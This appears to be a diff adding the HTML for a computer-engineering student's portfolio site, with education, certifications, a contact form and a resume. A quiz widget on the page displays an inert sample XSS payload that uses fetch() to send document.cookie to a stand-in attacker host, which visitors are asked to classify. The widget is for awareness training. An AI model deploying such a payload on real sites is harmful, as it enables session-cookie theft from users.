+                  <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+                </svg>
+                <span>View on GitHub</span>
+              </a>
+
+              <button class="btn btn-outline btn-sm" id="threat-mini-demo-btn">
+                <svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2">
+                  <polygon points="5 3 19 12 5 21 5 3"></polygon>
+                </svg>
+                <span>Test Threat Demo</span>
+              </button>
+            </div>
+          </div>
+        </div>
+
+        <!-- Inline Expandable Threat Simulator Widget -->
+        <div class="threat-simulator-inline hidden" id="threat-simulator-panel">
+          <div class="threat-sim-header">
+            <span class="sim-tag">⚡ Threat Intelligence Live Simulator</span>
+            <button class="sim-close-btn" id="close-sim-btn">✕</button>
+          </div>
+          <div class="threat-sim-body">
+            <p class="sim-instruction">Analyze this incoming payload &amp; classify threat severity:</p>
+            <div class="threat-payload-box">
+              <code>POST /api/v1/auth/login HTTP/1.1<br>Host: secure-banking-portal.tk<br>User-Agent: Mozilla/5.0 (Hydra-Scanner/v9.2)<br>Payload: &lt;script&gt;fetch('https://exfil.attacker.xyz/steal?c='+document.cookie)&lt;/script&gt;</code>
+            </div>
+            <div class="threat-sim-options">
+              <button class="sim-opt-btn" data-correct="false">Normal Safe Traffic</button>
+              <button class="sim-opt-btn" data-correct="false">Low Risk Crawler</button>
+              <button class="sim-opt-btn" data-correct="true">Critical XSS &amp; Token Exfiltration</button>
+            </div>
+            <div class="threat-sim-feedback hidden" id="sim-feedback-box"></div>
+          </div>
+        </div>
+      </article>
+
+      <!-- Bento Card 4: Education -->
+      <article class="bento-card card-education spotlight-card" id="education" data-tilt>
+        <div class="card-header">
+          <div class="card-title-group">
+            <span class="card-icon-box">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M22 10v6M2 10l10-5 10 5-10 5z"></path>
+                <path d="M6 12v5c3 3 9 3 12 0v-5"></path>
+              </svg>
+            </span>
+            <div>
+              <h2 class="card-title">Education</h2>
+            </div>
+          </div>
+        </div>
+
+        <!-- Education Timeline -->
+        <div class="education-timeline">
+          
+          <!-- Item 1: B.E. -->
+          <div class="timeline-item">
+            <div class="timeline-dot-wrapper">
+              <span class="timeline-dot active"></span>
+              <span class="timeline-line"></span>
+            </div>
+            <div class="timeline-content">
+              <div class="timeline-heading-row">
+                <h3 class="degree-title">B.E. in Computer Engineering <span class="pursuing-badge">(pursuing)</span></h3>
+                <span class="date-badge">Aug 2024 - present</span>
+              </div>
+              <p class="institution-name">PCET's Nutan Maharashtra Institute of Engineering and Technology, Pune</p>
+              <div class="timeline-meta">
+                <span class="meta-pill">Core: Data Structures, Operating Systems, Cloud &amp; AI</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Item 2: Diploma -->
+          <div class="timeline-item">
+            <div class="timeline-dot-wrapper">
+              <span class="timeline-dot"></span>
+            </div>
+            <div class="timeline-content">
+              <div class="timeline-heading-row">
+                <h3 class="degree-title">Diploma In Computer Engineering</h3>
+                <span class="date-badge">2022 - 2024</span>
+              </div>
+              <p class="institution-name">KPC Yogeshwari Polytechnic College, Ambajogai</p>
+              <div class="timeline-meta">
+                <span class="meta-pill">Foundation: Java, Web Tech, Database Systems</span>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </article>
+
+      <!-- Bento Card 5: Certifications -->
+      <article class="bento-card card-certifications spotlight-card" id="certifications" data-tilt>
+        <div class="card-header">
+          <div class="card-title-group">
+            <span class="card-icon-box">
+              <svg viewBox="0 0 24 24" width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <circle cx="12" cy="8" r="7"></circle>
+                <polyline points="8.21 13.89 7 23 12 20 17 23 15.79 13.88"></polyline>
+              </svg>
+            </span>
+            <div>
+              <h2 class="card-title">Certifications</h2>
+            </div>
+          </div>
+        </div>
+
+        <!-- Certification Cards List -->
+        <div class="certifications-list">
+          
+          <!-- Oracle Certification Card -->
+          <button class="cert-interactive-card" data-cert="oracle" aria-label="Inspect Oracle Databases for Developer Certification">
+            <div class="cert-left">
+              <div class="cert-logo-box oracle-bg">
+                <span class="oracle-logo-text">ORACLE</span>
+              </div>
+              <div class="cert-info">
+                <h3 class="cert-name">Oracle Databases for developer : Foundation</h3>
+                <span class="cert-issuer">Oracle Certified • Database Engineering</span>
+              </div>
+            </div>
+            <div class="cert-arrow">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="9 18 15 12 9 6"></polyline>
+              </svg>
+            </div>
+          </button>
+
+          <!-- AWS Certification Card -->
+          <button class="cert-interactive-card" data-cert="aws" aria-label="Inspect AWS Cloud Practitioner Essentials Certification">
+            <div class="cert-left">
+              <div class="cert-logo-box aws-bg">
+                <span class="aws-logo-text">aws</span>
+              </div>
+              <div class="cert-info">
+                <h3 class="cert-name">AWS Cloud Practitioner Essentials</h3>
+                <span class="cert-issuer">Amazon Web Services • Cloud Infrastructure</span>
+              </div>
+            </div>
+            <div class="cert-arrow">
+              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="9 18 15 12 9 6"></polyline>
+              </svg>
+            </div>
+          </button>
+
+        </div>
+      </article>
+
+    </section>
+
+    <!-- Contact & Quick Message Section -->
+    <section class="contact-section" id="contact">
+      <div class="contact-card spotlight-card" data-tilt>
+        <div class="contact-header">
+          <span class="card-icon-box">
+            <svg viewBox="0 0 24 24" width="22" height="22" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+            </svg>
+          </span>
+          <div>
+            <h2 class="contact-title">Let's Connect &amp; Collaborate</h2>
+            <p class="contact-subtitle">Have a project in mind, an internship opportunity, or just want to chat tech?</p>
+          </div>
+        </div>
+
+        <div class="contact-grid">
+          <!-- Direct Details -->
+          <div class="contact-direct-info">
+            <div class="direct-item">
+              <span class="direct-icon">📧</span>
+              <div>
+                <span class="direct-label">Email</span>
+                <a href="mailto:samyaksarwade1105@gmail.com" class="direct-value">samyaksarwade1105@gmail.com</a>
+              </div>
+            </div>
+
+            <div class="direct-item">
+              <span class="direct-icon">📱</span>
+              <div>
+                <span class="direct-label">Phone</span>
+                <a href="tel:+919552280697" class="direct-value">+91 9552280697</a>
+              </div>
+            </div>
+
+            <div class="direct-item">
+              <span class="direct-icon">📍</span>
+              <div>
+                <span class="direct-label">Location</span>
+                <span class="direct-value">Pune, Maharashtra, India</span>
+              </div>
+            </div>
+
+            <div class="direct-social-links">
+              <a href="https://github.com/SamyakSarwade" target="_blank" rel="noopener noreferrer" class="btn btn-secondary btn-sm">
+                <span>GitHub</span>
+              </a>
+              <a href="https://linkedin.com/in/samyak-sarwade" target="_blank" rel="noopener noreferrer" class="btn btn-secondary btn-sm">
+                <span>LinkedIn</span>
+              </a>
+            </div>
+          </div>
+
+          <!-- Interactive Contact Form -->
+          <form class="contact-form" id="portfolio-contact-form">
+            <div class="form-row">
+              <div class="form-group">
+                <label for="contact-name">Your Name</label>
+                <input type="text" id="contact-name" name="name" required placeholder="Jane Doe" autocomplete="name" />
+              </div>
+              <div class="form-group">
+                <label for="contact-email">Your Email</label>
+                <input type="email" id="contact-email" name="email" required placeholder="jane@example.com" autocomplete="email" />
+              </div>
+            </div>
+            <div class="form-group">
+              <label for="contact-subject">Subject</label>
+              <input type="text" id="contact-subject" name="subject" required placeholder="Job Opportunity / Project Inquiry" />
+            </div>
+            <div class="form-group">
+              <label for="contact-message">Message</label>
+              <textarea id="contact-message" name="message" rows="4" required placeholder="Hi Samyak, I'd like to discuss..."></textarea>
+            </div>
+            <button type="submit" class="btn btn-primary" id="submit-contact-btn">
+              <span>Send Message</span>
+              <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="22" y1="2" x2="11" y2="13"></line>
+                <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+              </svg>
+            </button>
+          </form>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Site Footer -->
+  <footer class="site-footer">
+    <div class="footer-container">
+      <div class="footer-left">
+        <p class="copyright-text">© 2025 Samyak Sarwade. All rights reserved.</p>
+      </div>
+
+      <div class="footer-right">
+        <a href="https://github.com/SamyakSarwade" target="_blank" rel="noopener noreferrer" class="footer-icon-link" aria-label="GitHub">
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+            <path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/>
+          </svg>
+        </a>
+        <a href="https://linkedin.com/in/samyak-sarwade" target="_blank" rel="noopener noreferrer" class="footer-icon-link" aria-label="LinkedIn">
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+            <path d="M19 0h-14c-2.761 0-5 2.239-5 5v14c0 2.761 2.239 5 5 5h14c2.762 0 5-2.239 5-5v-14c0-2.761-2.238-5-5-5zm-11 19h-3v-11h3v11zm-1.5-12.268c-.966 0-1.75-.79-1.75-1.764s.784-1.764 1.75-1.764 1.75.79 1.75 1.764-.783 1.764-1.75 1.764zm13.5 12.268h-3v-5.604c0-3.368-4-3.113-4 0v5.604h-3v-11h3v1.765c1.396-2.586 7-2.777 7 2.476v6.759z"/>
+          </svg>
+        </a>
+        <span class="footer-divider">|</span>
+        <button class="footer-text-btn copy-btn" data-copy="samyaksarwade1105@gmail.com" title="Copy Email">
+          <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
+            <polyline points="22,6 12,13 2,6"></polyline>
+          </svg>
+          <span>Email</span>
+        </button>
+        <button id="scroll-to-top-btn" class="scroll-top-btn" aria-label="Scroll to top" title="Scroll to top">
+          <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <polyline points="18 15 12 9 6 15"></polyline>
+          </svg>
+        </button>
+      </div>
+    </div>
+  </footer>
+
+  <!-- ================= MODALS & OVERLAYS ================= -->
+
+  <!-- 1. View All Skills Matrix Modal -->
+  <dialog id="skills-modal" class="custom-modal">
+    <div class="modal-surface">
+      <div class="modal-header">
+        <div class="modal-title-wrap">
+          <span class="card-icon-box">⚡</span>
+          <h3>Full Technical Stack &amp; Proficiency Matrix</h3>
+        </div>
+        <button class="modal-close-icon" data-close="skills-modal">✕</button>
+      </div>
+      <div class="modal-body">
+        <p class="modal-lead">Explore Samyak's comprehensive skill matrix, proficiency ratings, and project associations.</p>
+        
+        <div class="proficiency-group">
+          <h4>Core Languages &amp; Fundamentals</h4>
+          <div class="proficiency-bars">
+            <div class="prof-item">
+              <div class="prof-label-row"><span>Java (Core &amp; Advanced)</span><span class="prof-percent">90%</span></div>
+              <div class="prof-bar"><div class="prof-fill" style="width: 90%;"></div></div>
+            </div>
+            <div class="prof-item">
+              <div class="prof-label-row"><span>Python (AI/ML &amp; Scripting)</span><span class="prof-percent">88%</span></div>
+              <div class="prof-bar"><div class="prof-fill" style="width: 88%;"></div></div>
+            </div>
+            <div class="prof-item">
+              <div class="prof-label-row"><span>SQL &amp; Database Design</span><span class="prof-percent">85%</span></div>
+              <div class="prof-bar"><div class="prof-fill" style="width: 85%;"></div></div>
+            </div>
+            <div class="prof-item">
+              <div class="prof-label-row"><span>C / C++</span><span class="prof-percent">80%</span></div>
+              <div class="prof-bar"><div class="prof-fill" style="width: 80%;"></div></div>
+            </div>
+          </div>
+        </div>
+
+        <div class="proficiency-group">
+          <h4>Frameworks &amp; Cloud</h4>
+          <div class="proficiency-bars">
+            <div class="prof-item">
+              <div class="prof-label-row"><span>Spring &amp; Microservices</span><span class="prof-percent">85%</span></div>
+              <div class="prof-bar"><div class="prof-fill" style="width: 85%;"></div></div>
+            </div>
+            <div class="prof-item">
+              <div class="prof-label-row"><span>React.js Frontend</span><span class="prof-percent">82%</span></div>
+              <div class="prof-bar"><div class="prof-fill" style="width: 82%;"></div></div>
+            </div>
+            <div class="prof-item">
+              <div class="prof-label-row"><span>AWS (EC2, S3, IAM)</span><span class="prof-percent">80%</span></div>
+              <div class="prof-bar"><div class="prof-fill" style="width: 80%;"></div></div>
+            </div>
+            <div class="prof-item">
+              <div class="prof-label-row"><span>AI / ML (LangChain, RAG, LLMs)</span><span class="prof-percent">82%</span></div>
+              <div class="prof-bar"><div class="prof-fill" style="width: 82%;"></div></div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </dialog>
+
+  <!-- 2. Certification Details Modal -->
+  <dialog id="cert-modal" class="custom-modal">
+    <div class="modal-surface">
+      <div class="modal-header">
+        <div class="modal-title-wrap">
+          <span class="card-icon-box" id="cert-modal-icon">🏆</span>
+          <h3 id="cert-modal-title">Certificate Verification</h3>
+        </div>
+        <button class="modal-close-icon" data-close="cert-modal">✕</button>
+      </div>
+      <div class="modal-body" id="cert-modal-body">
+        <!-- Injected via JavaScript -->
+      </div>
+    </div>
+  </dialog>
+
+  <!-- 3. Projects Modal -->
+  <dialog id="projects-modal" class="custom-modal">
+    <div class="modal-surface">
+      <div class="modal-header">
+        <div class="modal-title-wrap">
+          <span class="card-icon-box">📁</span>
+          <h3>All Engineered Projects</h3>
+        </div>
+        <button class="modal-close-icon" data-close="projects-modal">✕</button>
+      </div>
+      <div class="modal-body">
+        <div class="all-projects-list">
+          <div class="project-modal-card">
+            <h4>Cyber Threat Awareness Portal</h4>
+            <p>Interactive educational platform with quizzes, threat intelligence feed, and attack scenario simulations.</p>
+            <div class="tech-pills"><span class="tech-tag">Python</span><span class="tech-tag">Firebase</span><span class="tech-tag">Web</span></div>
+          </div>
+          <div class="project-modal-card">
+            <h4>AI-Powered Knowledge &amp; RAG Chatbot</h4>
+            <p>Context-aware question answering system using LangChain, vector embeddings, and LangGraph workflow orchestration.</p>
+            <div class="tech-pills"><span class="tech-tag">LangChain</span><span class="tech-tag">Python</span><span class="tech-tag">RAG</span></div>
+          </div>
+          <div class="project-modal-card">
+            <h4>Cloud-Native Microservices Backend</h4>
+            <p>High-concurrency RESTful microservices architecture with Spring Boot, MySQL, and Docker containerization on AWS.</p>
+            <div class="tech-pills"><span class="tech-tag">Spring Boot</span><span class="tech-tag">AWS</span><span class="tech-tag">Microservices</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </dialog>
+
+  <!-- 4. Interactive Resume Viewer Modal -->
+  <dialog id="resume-modal" class="custom-modal resume-dialog">
+    <div class="modal-surface resume-surface">
+      <div class="modal-header">
+        <div class="modal-title-wrap">
+          <span class="card-icon-box">📄</span>
+          <h3>Samyak Sarwade - Resume</h3>
+        </div>
+        <div class="resume-modal-actions">
+          <button class="btn btn-primary btn-sm" id="print-resume-btn">Print / Save PDF</button>
+          <button class="modal-close-icon" data-close="resume-modal">✕</button>
+        </div>
+      </div>
+      <div class="modal-body resume-body" id="resume-printable-area">
+        <div class="resume-sheet">
+          <header class="resume-sheet-header">
+            <h2>Samyak Sarwade</h2>
+            <p class="resume-subtitle">Computer Engineering Student | Software Developer</p>
+            <p class="resume-contacts">
+              <span>Pune, Maharashtra</span> • 
+              <span>Phone: +91 9552280697</span> • 
+              <span>Email: samyaksarwade1105@gmail.com</span>
+            </p>
+          </header>
+
+          <section class="resume-section">
+            <h3 class="resume-sec-title">Education</h3>
+            <div class="resume-item">
+              <div class="resume-row">
+                <strong>B.E. in Computer Engineering (pursuing)</strong>
+                <span>Aug 2024 - Present</span>
+              </div>
+              <p>PCET's Nutan Maharashtra Institute of Engineering and Technology, Pune</p>
+            </div>
+            <div class="resume-item">
+              <div class="resume-row">
+                <strong>Diploma in Computer Engineering</strong>
+                <span>2022 - 2024</span>
+              </div>
+              <p>KPC Yogeshwari Polytechnic College, Ambajogai</p>
+            </div>
+          </section>
+
+          <section class="resume-section">
+            <h3 class="resume-sec-title">Technical Skills</h3>
+            <p><strong>Languages:</strong> Java, Python, C, C++, SQL</p>
+            <p><strong>Frameworks &amp; Libraries:</strong> React.js, Spring, Microservices, REST APIs, Hibernate, JPA, JDBC</p>
+            <p><strong>Cloud &amp; DevOps:</strong> AWS (EC2, S3), Git, GitHub, Tomcat</p>
+            <p><strong>Databases &amp; Tools:</strong> OracleDB, MySQL, MongoDB, JUnit, Maven, VS Code, Postman</p>
+            <p><strong>AI / ML:</strong> LangChain, LangGraph, RAG, LLM, Prompt Engineering, Numpy, Pandas</p>
+          </section>
+
+          <section class="resume-section">
+            <h3 class="resume-sec-title">Key Projects</h3>
+            <div class="resume-item">
+              <strong>Cyber Threat Awareness Portal</strong>
+              <p>Developed a full web platform to educate users about cyber threats through quizzes, videos and real-time threat intelligence.</p>
+            </div>
+          </section>
+
+          <section class="resume-section">
+            <h3 class="resume-sec-title">Certifications</h3>
+            <p>• Oracle Databases for developer : Foundation</p>
+            <p>• AWS Cloud Practitioner Essentials</p>
+          </section>
+        </div>
+      </div>
+    </div>
+  </dialog>
+
+  <!-- JavaScript Modules -->
+  <script src="scripts/canvas.js"></script>
+  <script src="scripts/spotlight.js"></script>
+  <script src="scripts/skills.js"></script>
+  <script src="scripts/threat-demo.js"></script>
+  <script src="scripts/contact.js"></script>
+  <script src="scripts/main.js"></script>
+</body>
+</html>
